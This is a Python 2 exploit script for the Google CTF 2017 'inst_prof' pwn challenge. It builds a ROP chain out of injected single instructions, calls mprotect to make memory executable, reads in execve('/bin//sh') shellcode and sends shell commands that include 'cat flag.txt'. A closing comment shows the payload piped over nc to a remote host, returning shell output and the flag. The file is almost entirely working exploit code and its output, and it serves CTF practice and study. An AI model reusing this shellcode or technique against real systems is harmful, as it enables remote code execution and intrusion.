#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# Google CTF 2017 - inst_prof (PWN 435pt)
# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    #
    # exploit works w/o an information leak, which means that it doesn't have to be interactive.
    # So, exploit is cute :)
    #
    # The goal here is use the "1 instruction execution" loop multiple times to construct a ROP
    # chain. The ROP chain will:
    #   [1]. Set rdx to 7 (7 = RWX)
    #
    #   [2]. Return to make_page_executable()+6 (mprotect)
    #           and make the region of injected instruction W+X
    #
    #   [3]. Return to n_read() to write a large number of bytes to that region
    #
    #   [4]. Return to this region
    #
    #   Before ROP execution, rsi must contain be a multiple of a page size (4K here) and
    #   rdi must point to the beginning of the region that executes the injected instruction.
    #
    #
    # Notes:
    #   [1]. Registers r13, r14 and r15 do not change between executions injected instructions,
    #           so we can use them as storage.
    #
    #   [2]. The return address of do_test() is at rbp+8, so our ROP chain starts at rbp+0x10
    #
    #   [3]. Before the execution of the injected instruction rbx = rdi = &region, and rsi = 4096
    #   
    #   [4]. Because binary is PIE, so we can't hardcode any addresses. However the offsets do
    #           not change, so we don't have to leak any address. Instead we add/sub a constant
    #           offset from that address and we simply use it.
    #
    #   [5]. Instructions should not be affected by the "ecx loop"
    #


    # -------------------- set 1st element of ROP: 7 --------------------

    # ecx loop does not affect us here
    ins  = "\x6a\x07"                       # push 0x7
    ins += "\x41\x5f"                       # pop  r15

    ins += "\x4c\x89\x7d\x10"               # movq [rbp+0x10], r15  (don't rsp, as it's 5 bytes)


    # -------------------- write 2nd element of ROP: &mprotect --------------------

    ins += "\x4c\x8b\x34\x24"               # movq  r14, [rsp]  (r14 = do_test+0x58)


    # do_test+58 at: 0x00005577B68DEB18
    # mprotect   at: 0x00005577B68DEA2F (jmp mprotect)
    # diff = 0xe9
    for i in range(0xe9):
        ins += "\x49\xff\xce"               # dec  r14
        ins += "\xc3"                       # retn  (break the loop)

    ins += "\x4c\x89\x75\x18"               # movq [rbp+0x18], r14  (r14 = &mprotect)


    # mprotect does not modify rsi nor rdi, so we're good to go!


    # -------------------- write 3rd element of ROP: &read_n --------------------
    
    ins += "\x4c\x8b\x34\x24"               # movq  r14, [rsp]  (r14 = do_test+0x58)

    # do_test+58 at: 0x00005577B68DEB18
    # mprotect   at: 0x00005577B68DEABA (jmp read_n)
    #   (instead of returing to read_n, return to "jmp read_n" which has a smaller offset)
    # diff = 0x5e
    for i in range(0x5e):
        ins += "\x49\xff\xce"               # dec  r14
        ins += "\xc3"                       # retn  (break the loop)


    ins += "\x4c\x89\x75\x20"               # movq [rbp+0x20], r14  (r14 = &n_read)


    # -------------------- write 4th element of ROP: &shellcode --------------------

    ins += "\x48\x89\x5d\x28"               # movq [rbp+0x28], rbx


    # -------------------- trigger ROP  --------------------
    '''
    # method 2 to set rsp to the ROP chain (it doesn't set rdx though)

    ins += "\x49\x89\xee"                   # mov  r14, rbp
    ins += "\x90"                           # nop
    
    for i in range(0x10):
        ins += "\x49\xff\xc6"               # inc    r14
        ins += "\xc3"                       # retn
    
    ins += "\x4c\x89\xf4"                   # mov  rsp, r14 (r14 = rbp+0x10)
    ins += "\xc3"                           # retn
    '''

    ins += "\xc9"                           # leave         (move rsp higher)
    ins += "\x58"                           # pop  rax      (rax = garbage)
    ins += "\x5a"                           # pop  rdx      (rdx = 7)
    ins += "\xc3"                           # retn          (return to mprotect)


    # At this point we're at n_read and we can write our shellcode to the region:
    sc  = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
    sc += "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
    sc += "\x00"*4096                       # pad input as read_n expects 4KB of input data


    # shell is opened. Send commands
    cmd  = "id"           + "\n\n"          # commands to execute
    cmd += "date"         + "\n\n"
    cmd += "ls -l"        + "\n\n"
    cmd += "cat flag.txt" + "\n\n"
    

    print ins + sc + cmd                    # simply print the payload to stdout

# --------------------------------------------------------------------------------------------------
'''
ispo@ispo:~/google_ctf_17$ python inst_prof_expl.py | nc 35.187.118.28 1337
initializing prof...ready
    [..... TRUNCATED FOR BREVITY .....]

    uid=1337(user) gid=1337(user) groups=1337(user)
    
    Sun May 21 23:19:40 UTC 2017
    
    total 20
    -rwxr-xr-x 1 user user    37 May 15 20:13 flag.txt
    -rwxr-xr-x 1 user user 13316 May 15 20:13 inst_prof
    
    CTF{0v3r_4ND_0v3r_4ND_0v3r_4ND_0v3r}

ispo@ispo:~/google_ctf_17$
'''
# --------------------------------------------------------------------------------------------------
